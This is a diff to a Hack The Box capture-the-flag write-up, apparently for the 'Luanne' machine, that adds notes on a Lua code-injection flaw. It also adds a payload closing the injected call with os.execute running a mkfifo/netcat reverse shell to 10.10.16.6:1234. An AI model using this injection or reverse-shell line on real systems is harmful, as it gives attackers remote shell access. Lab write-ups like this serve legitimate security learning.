@@ -14,7 +14,7 @@ priority: 1
 
 * Nmap scan.
 * Web enumertation.
-* Lua web application security vulnerabilities.
+* Lua code injection vulnerability.
 * Getting reverse shell.
 * Enumerate luanne.
 * Getting id_rsa for a user.
@@ -78,10 +78,18 @@ priority: 1
 
 ![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/97f1a229-81a0-4fc5-a5bd-a1563ef5d03a/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAT73L2G45O3KS52Y5%2F20210326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20210326T223414Z&X-Amz-Expires=86400&X-Amz-Signature=1a4dc9c7f0f8694c1e8fa955301877b599fc83c7420080adeb386ce8f37a0d03&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22)
 
-**It's just a weather statues for every city, I stucked here and got hint from HTB fourms. 
+* It's just a weather statues for every city, I stucked here and got hint from HTB fourms. 
 
 ![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/d25b6f67-0786-4f9a-a430-2037802b6cb9/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAT73L2G45O3KS52Y5%2F20210326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20210326T224449Z&X-Amz-Expires=86400&X-Amz-Signature=9ccb6b1fb1178961d4a5f681732eb4bd5fdec19c0ecd92531045733a69b1f4df&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22)
 
+**Lua web application vulnerable to code injection by add a missing round brackets().**
+
+* to get the shell we have to know the operating system and it's netBSD 
+* by addind the missing round bracket to the shell 
+
+```ruby
+');os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.6 1234 >/tmp/f")—
+``` 
 
 ![]()
 ![]()
